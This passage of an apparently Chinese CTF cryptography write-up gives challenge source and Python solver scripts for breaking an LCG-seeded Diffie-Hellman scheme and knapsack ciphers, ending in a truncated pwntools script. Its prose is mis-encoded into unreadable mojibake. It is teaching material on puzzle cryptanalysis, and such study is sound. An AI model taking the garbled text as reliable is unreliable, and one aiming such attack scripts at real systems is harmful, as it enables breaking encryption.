class="string">'''</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸€é“é¢˜ä¸¤ä¸ªçŸ¥è¯†ç‚¹ï¼Œä¸€ä¸ªæ˜¯LCGï¼Œä¸€ä¸ªæ˜¯DHPï¼Œå…¶ä¸­ï¼ŒDHPç”¨äºåŠ å¯†flagï¼Œæˆ‘ä»¬è¦å¾—åˆ°flagå°±è¦è·å¾—åå•†å¯†é’¥ã€‚è€Œè·å¾—åå•†å¯†é’¥çš„æ–¹æ³•å°±æ˜¯çŸ¥é“ä¸€æ–¹çš„ç§é’¥ã€‚è€ŒåŒæ–¹çš„ç§é’¥ä½¿ç”¨LCGç”Ÿæˆçš„ã€‚</p><p>LCGä¸­çš„ä¸‰ä¸ªå‚æ•°a,b,mæˆ‘ä»¬éƒ½çŸ¥é“ã€‚ç„¶åç»™å‡ºäº†s1 å’Œ s2 çš„é«˜ä½ã€‚ä½16ä½æœªçŸ¥ã€‚è¿™é‡Œå®Œå…¨å¯ä»¥çˆ†ç ´ã€‚</p><p>çˆ†ç ´s1ï¼Œç„¶åç”Ÿæˆs2ï¼Œçœ‹é«˜ä½æ˜¯å¦ä¸ç»™å‡ºçš„s2é«˜ä½ä¸€è‡´æ¥ç¡®å®šã€‚æœ€ç»ˆçˆ†å‡ºå››ä¸ªç¬¦åˆçš„å€¼ã€‚</p><p>ç„¶åå°±åˆ©ç”¨å››ä¸ªå¯èƒ½çš„s2å’Œa, b, mï¼Œæ ¹æ®é¢˜ç›®ç”Ÿæˆå¯†é’¥çš„æ–¹å¼æ¥ç”ŸæˆAçš„å››ä¸ªå¯èƒ½ç§é’¥ã€‚å†åˆ©ç”¨Bçš„å…¬é’¥è·å¾—å››ä¸ªåå•†å¯†é’¥ã€‚ç„¶åçœ‹è§£å¯†ç»“æœï¼Œæ‰¾å‡ºflagã€‚</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">a = <span class="number">3844066521</span></span><br><span class="line">b = <span class="number">3316005024</span></span><br><span class="line">m = <span class="number">2249804527</span></span><br><span class="line">state1 = <span class="number">16269</span></span><br><span class="line">state2 = <span class="number">4249</span></span><br><span class="line">M = <span class="number">102752586316294557951738800745394456033378966059875498971396396583576430992701</span></span><br><span class="line">B = <span class="number">74913924633988481450801262607456437193056607965094613549273335198280176291445</span></span><br><span class="line">A = <span class="number">102248652770540219619953045171664636108622486775480799200725530949685509093530</span></span><br><span class="line">c = <span class="number">13040004482819935755130996285494678592830702618071750116744173145400949521388647864913527703</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">16</span>):</span><br><span class="line">    s = state1&lt;&lt;<span class="number">16</span></span><br><span class="line">    s+=i</span><br><span class="line">    <span class="keyword">if</span> ((a*s+b)%m)&gt;&gt;<span class="number">16</span> == <span class="number">4249</span>:</span><br><span class="line">        s2 = (a*s+b)%m</span><br><span class="line">        <span class="keyword">print</span> s2</span><br><span class="line">        x=<span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">            s2 = (a*s2+b)%m</span><br><span class="line">            x += <span class="string">'1'</span> <span class="keyword">if</span> (s2&gt;&gt;<span class="number">16</span>) % <span class="number">2</span> <span class="keyword">else</span> <span class="string">'0'</span></span><br><span class="line">        x = int(x,<span class="number">2</span>)</span><br><span class="line">        key = pow(B,x,M)</span><br><span class="line">        flag = key^c</span><br><span class="line">        <span class="keyword">print</span> long_to_bytes(flag)</span><br></pre></td></tr></table></figure><h3 id="knapsack"><a href="#knapsack" class="headerlink" title="knapsack"></a>knapsack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genKey</span><span class="params">(length)</span>:</span></span><br><span class="line">    A, B = getPrime(<span class="number">64</span>), getPrime(<span class="number">1025</span>)</span><br><span class="line"></span><br><span class="line">    Rn = getPrime(<span class="number">1024</span>)</span><br><span class="line">    key1 = [Rn//<span class="number">2</span>**i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, length+<span class="number">1</span>)]</span><br><span class="line">    key2 = [i*A % B <span class="keyword">for</span> i <span class="keyword">in</span> key1]</span><br><span class="line">    <span class="keyword">return</span> key1,key2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(text,key)</span>:</span></span><br><span class="line">    Sum=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(text)):</span><br><span class="line">        Sum+=int(text[i])*key[i]</span><br><span class="line">    <span class="keyword">return</span> Sum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(Ciper,Key)</span>:</span></span><br><span class="line">    f1=open(<span class="string">"pub.txt"</span>,<span class="string">"w"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(Key)):</span><br><span class="line">        f1.write(str(Key[i])+<span class="string">'\n'</span>)</span><br><span class="line">    f2=open(<span class="string">"cip.txt"</span>,<span class="string">"w"</span>)</span><br><span class="line">    f2.write(hex(Ciper))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FLAG = bin(bytes_to_long(flag.encode()))[<span class="number">2</span>:]</span><br><span class="line">Key1,Key2 = genKey(len(FLAG))</span><br><span class="line">Ciper = encrypt(FLAG,Key1)</span><br><span class="line">save(Ciper,Key2)</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªè¶…é€’å¢èƒŒåŒ…é—®é¢˜ã€‚ä½†è¿™é‡Œç”¨çš„æ˜¯ä¸€ä¸ªè¶…é€’å‡åºåˆ—</p><p>å¹¶ä¸”å¯¹è¿™ä¸ªåºåˆ—åšäº†ä¸€æ¬¡åŠ å¯†ï¼ŒåŠ å¯†æ–¹å¼ä¸º a*A % Bï¼Œå…¶ä¸­xä¸ºåºåˆ—ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ ï¼ŒBå¤§äºåºåˆ—ä¸­æœ€å¤§çš„å…ƒç´ ã€‚</p><p>æƒ³è¦è§£å¯†ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦è·å¾—Aå’ŒBï¼Œç„¶åæ¥é€šè¿‡æ±‚é€†æ¥è·å¾—åŸåºåˆ—ã€‚</p><p>è·å¾—Açš„æ–¹å¼å¾ˆç®€å•ã€‚è¿™ä¸ªåºåˆ—çš„æœ€å°çš„å€¼å¾ˆå°ï¼Œè¿™ä¸ªæ—¶å€™ç”¨ä¸åˆ°æ¨¡è¿ç®—ï¼Œæˆ‘ä»¬åªéœ€è¦å¯¹æ¯”è¾ƒå°çš„ä¸¤ä¸ªå€¼æ±‚ä¸€ä¸ªæœ€å¤§å…¬å› æ•°å°±èƒ½å¾—åˆ°Aã€‚</p><p>è‡³äºæ±‚Bï¼Œæˆ‘ä»¬æ‰¾åˆ°æ¯”è¾ƒå¤§çš„ä¸¤ä¸ªæ•°ï¼Œå¹¶ä¸”æ»¡è¶³å¦‚ä¸‹å…³ç³»ï¼Œå³$a_{i+1} &lt; a_{i}$ï¼Œï¼ˆæˆ‘ä»¬è®¾æœ€å°çš„ä¸º$a_0$ï¼‰è¿™æ˜¯ä¸ç¬¦åˆåºåˆ—çš„å•è°ƒæ€§çš„ï¼Œä¹Ÿå°±æ„å‘³ç€è¿™é‡Œå­˜åœ¨ä¸€æ¬¡æ¨¡è¿ç®—ã€‚ä¸”è¿™é‡Œçš„é€’å‡æ˜¯ç”¨æ•´é™¤2æ¥å¾—åˆ°çš„ã€‚æ‰€ä»¥è¦ä¹ˆ$a_{i}\cdot 2 - a_{i+1} = B$ï¼Œè¦ä¹ˆ$a_{i}\cdot 2 + A - a_{i+1} = B$ ã€å› ä¸ºè¿™é‡Œæ˜¯æ•´é™¤å˜›ï¼Œè¿™ä¸éš¾ç†è§£ã€‘</p><p>æœ‰äº†åŸæ¥çš„è¶…é€’å‡åºåˆ—ï¼Œè¿™ä¸ªé—®é¢˜å°±å¾ˆç®€å•äº†ã€‚æˆ‘ä»¬åªéœ€è¦å¯¹è¿™ä¸ªåºåˆ—ä»å¤´å¼€å§‹åˆ¤æ–­ã€‚å¦‚æœå¯†æ–‡å¤§äºè¿™ä¸ªå…ƒç´ ï¼Œflagçš„æœ€é«˜ä½bitå°±æ˜¯1ï¼Œç„¶åå°†å¯†æ–‡å‡å»è¿™ä¸ªå…ƒç´ ã€‚å¦åˆ™flagçš„è¿™ä¸€ä¸ªbitä½å°±æ˜¯0ï¼Œç»§ç»­ä¸‹ä¸€ä¸ªå…ƒç´ ä¸å¯†æ–‡çš„å¤§å°åˆ¤æ–­ã€‚å¦‚æ­¤å¾ªç¯ã€‚æœ€åè§£å¯†å¾—åˆ°flagã€‚</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">b=<span class="number">335428611041311731398614259824482604248524861615176787429946575184146370361110652887115402376826444538743339055691850202034085349274540292019392290484025358504275054761608502214481606484088807087063751542648223811793597463026662881020647708165593980984857948283181770647446888695205803952635117800114545071259</span></span><br><span class="line">a=<span class="number">11243098275181678343</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"pub.txt"</span>)<span class="keyword">as</span> f:</span><br><span class="line">    data=f.read()</span><br><span class="line"></span><br><span class="line">data=data.split(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">datai=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    datai.append(int(i))</span><br><span class="line">dataii=[] </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> datai:</span><br><span class="line">    dataii.append(i*inverse(a,b)%b)</span><br><span class="line"></span><br><span class="line">c=<span class="number">0x8ab3086a3df540d4652c191951756a6574aca491d933e479330532f0586ce03862f82f36dea8038b8bfb0b394331d7a93050efa2a26e46d9d8ca394600456cd79e02890a2c31b02e920c28a9f27c3943ec68fe5555ff4056358f35869859d67d67702edf44b10a7690acbaeea1f4def46392922069bfb71c173a210e9ab384f7</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dataii:</span><br><span class="line">    <span class="keyword">if</span> c&gt;=i:</span><br><span class="line">        flag+=<span class="string">'1'</span></span><br><span class="line">        c-=i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag+=<span class="string">'0'</span></span><br><span class="line"><span class="keyword">print</span> long_to_bytes(int(flag,<span class="number">2</span>))</span><br></pre></td></tr></table></figure><h3 id="Backpacker"><a href="#Backpacker" class="headerlink" title="Backpacker"></a>Backpacker</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> random</span><br><span class="line">flag = <span class="string">'flag'</span></span><br><span class="line"></span><br><span class="line">banner = <span class="string">'''</span></span><br><span class="line"><span class="string"> ____             _                     _             _       _   _ </span></span><br><span class="line"><span class="string">| __ )  __ _  ___| | ___ __   __ _  ___| | _____ _ __( )___  | | | | ___  _ __ ___   ___</span></span><br><span class="line"><span class="string">|  _ \ / _` |/ __| |/ / '_ \ / _` |/ __| |/ / _ \ '__|// __| | |_| |/ _ \| '_ ` _ \ / _ \\</span></span><br><span class="line"><span class="string">| |_) | (_| | (__|   &lt;| |_) | (_| | (__|   &lt;  __/ |    \__ \ |  _  | (_) | | | | | |  __/</span></span><br><span class="line"><span class="string">|____/ \__,_|\___|_|\_\ .__/ \__,_|\___|_|\_\___|_|    |___/ |_| |_|\___/|_| |_| |_|\___|</span></span><br><span class="line"><span class="string">                      |_|'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timeout_handler</span><span class="params">(signum, frame)</span>:</span></span><br><span class="line">    print(<span class="string">"\n[!]Sorry, timeout..."</span>)</span><br><span class="line">    <span class="keyword">raise</span> TimeoutError</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] Proof of work [++++++++++++++++]"</span>)</span><br><span class="line">    proof = <span class="string">''</span>.join(</span><br><span class="line">        [random.choice(string.ascii_letters+string.digits)</span><br><span class="line">         <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">20</span>)]</span><br><span class="line">    )</span><br><span class="line">    proof_cipher = sha256(proof.encode()).hexdigest()</span><br><span class="line">    print(<span class="string">"sha256(XXXX+&#123;&#125;) == &#123;&#125;"</span>.format(proof[<span class="number">4</span>:], proof_cipher))</span><br><span class="line">    guess = input(<span class="string">"Give me XXXX: "</span>)</span><br><span class="line">    <span class="keyword">if</span> len(guess) != <span class="number">4</span> <span class="keyword">or</span> sha256((guess + proof[<span class="number">4</span>:]).encode()).hexdigest() != proof_cipher:</span><br><span class="line">        print(<span class="string">"[++++++++++++++++] You failed, exit... [++++++++++++++++]"</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    print(<span class="string">"[++++++++++++++++] Proof of work has passed [++++++++++++++++]"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Knapsack</span>:</span></span><br><span class="line">    n = <span class="literal">None</span></span><br><span class="line">    elements = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(self, n, nbits)</span>:</span></span><br><span class="line">        self.n = n</span><br><span class="line">        self.elements = set()</span><br><span class="line">        <span class="keyword">while</span> len(self.elements) &lt; n:</span><br><span class="line">            self.elements.add(getRandomNBitInteger(nbits))</span><br><span class="line">        self.elements = list(self.elements)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">super_load</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        self.n = n</span><br><span class="line">        self.elements = [<span class="number">233</span>]</span><br><span class="line">        sum = <span class="number">233</span></span><br><span class="line">        <span class="keyword">while</span> len(self.elements) &lt; n:</span><br><span class="line">            self.elements.append(sum + getRandomRange(<span class="number">1</span>, <span class="number">128</span>))</span><br><span class="line">            sum += self.elements[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.n <span class="keyword">or</span> <span class="keyword">not</span> self.elements:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">"[!]Something Wrong..."</span>)</span><br><span class="line">        m = getRandomNBitInteger(self.n)</span><br><span class="line">        m_list = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> bin(m)[<span class="number">2</span>:]]</span><br><span class="line">        c = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.n):</span><br><span class="line">            c += m_list[i] * self.elements[i]</span><br><span class="line">        <span class="keyword">return</span> (c, m)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_1</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] Enjoy challenge_1 [++++++++++++++++]"</span>)</span><br><span class="line">    K = Knapsack()</span><br><span class="line">    K.load(<span class="number">10</span>, <span class="number">16</span>)</span><br><span class="line">    print(<span class="string">"[+]There are &#123;&#125; elements in the knapsack."</span>.format(K.n))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(K.n):</span><br><span class="line">        print(K.elements[i])</span><br><span class="line">    (c, m) = K.encrypt()</span><br><span class="line">    print(<span class="string">"[+]c = &#123;&#125;"</span>.format(c))</span><br><span class="line">    guess = input(<span class="string">"[-]m(hex) = "</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        guess = int(guess, <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> guess == m:</span><br><span class="line">            print(<span class="string">"[++++++++++++++++] challenge_1 has passed [++++++++++++++++]"</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] You failed, exit... [++++++++++++++++]"</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_2</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] Enjoy challenge_2 [++++++++++++++++]"</span>)</span><br><span class="line">    K = Knapsack()</span><br><span class="line">    K.super_load(<span class="number">50</span>)</span><br><span class="line">    print(<span class="string">"[+]There are &#123;&#125; elements in the knapsack."</span>.format(K.n))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(K.n):</span><br><span class="line">        print(K.elements[i])</span><br><span class="line">    (c, m) = K.encrypt()</span><br><span class="line">    print(<span class="string">"[+]c = &#123;&#125;"</span>.format(c))</span><br><span class="line">    guess = input(<span class="string">"[-]m(hex) = "</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        guess = int(guess, <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> guess == m:</span><br><span class="line">            print(<span class="string">"[++++++++++++++++] challenge_2 has passed [++++++++++++++++]"</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] You failed, exit... [++++++++++++++++]"</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_3</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] Enjoy challenge_3 [++++++++++++++++]"</span>)</span><br><span class="line">    K = Knapsack()</span><br><span class="line">    K.load(<span class="number">100</span>, <span class="number">312</span>)</span><br><span class="line">    print(<span class="string">"[+]There are &#123;&#125; elements in the knapsack."</span>.format(K.n))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(K.n):</span><br><span class="line">        print(K.elements[i])</span><br><span class="line">    (c, m) = K.encrypt()</span><br><span class="line">    print(<span class="string">"[+]c = &#123;&#125;"</span>.format(c))</span><br><span class="line">    guess = input(<span class="string">"[-]m(hex) = "</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        guess = int(guess, <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> guess == m:</span><br><span class="line">            print(<span class="string">"[++++++++++++++++] challenge_3 has passed [++++++++++++++++]"</span>)</span><br><span class="line">            print(<span class="string">"[+]Excellent Backpacker, your flag is &#123;&#125;"</span>.format(flag))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] You failed, exit... [++++++++++++++++]"</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    proof_of_work()</span><br><span class="line">    challenge_1()</span><br><span class="line">    challenge_2()</span><br><span class="line">    challenge_3()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(banner)</span><br><span class="line">        signal.signal(signal.SIGALRM, timeout_handler)</span><br><span class="line">        signal.alarm(<span class="number">6000000</span>)</span><br><span class="line">        main()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯èƒŒåŒ…é—®é¢˜ï¼Œä¸€å…±ä¸‰å…³ã€‚</p><p>ç¬¬ä¸€å…³ï¼Œç”±äºæ•°å­—å¾ˆå°ã€‚èŒƒå›´æ˜¯0åˆ°1023ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥çˆ†ç ´å¾—åˆ°ã€‚</p><p>ç¬¬äºŒå…³ï¼Œæ˜¯è¶…é€’å¢èƒŒåŒ…é—®é¢˜ã€‚è·Ÿä¸Šé¢é‚£ä¸ªä¸€æ ·çš„ã€‚</p><p>ç¬¬ä¸‰å…³ï¼Œä¸æ˜¯è¶…é€’å¢èƒŒåŒ…é—®é¢˜äº†ï¼Œç„¶åé‡æ¯”è¾ƒå¤§ï¼Œæ•°å­—ä¹Ÿæ¯”è¾ƒå¤§ã€‚è¿™é‡Œç”¨Latiiceå¯ä»¥è§£å†³ã€‚æ ¼é•¿è¿™æ ·</p><p><img src="https://i.loli.net/2020/05/23/TPY4iVzJloIbMXc.png" alt></p><p>ç„¶åè§£èµ·æ¥æœ‰æ¦‚ç‡é—®é¢˜ã€‚å°±ç®—æ ¼åŸºè§„çº¦æˆåŠŸäº†ï¼Œä¹Ÿåªæœ‰1/2çš„æ¦‚ç‡æˆåŠŸã€‚ç”±äºæ²¡æœ‰sageç¯å¢ƒï¼Œè¿™é‡Œæ˜¯åŠè‡ªåŠ¨è„šæœ¬</p><p>äº¤äº’è„šæœ¬ï¼Œå¯ä»¥æ‰“åˆ°ç¬¬ä¸‰å…³ï¼Œç„¶åæ‹¿åˆ°æ•°æ®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime <span class="keyword">as</span> getprime ,long_to_bytes,bytes_to_long,inverse</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(data,m)</span>:</span></span><br><span class="line">    m = bin(m)[<span class="number">2</span>:]</span><br><span class="line">    c = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(m)):</span><br><span class="line">        c += int(m[i])*data[i]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span 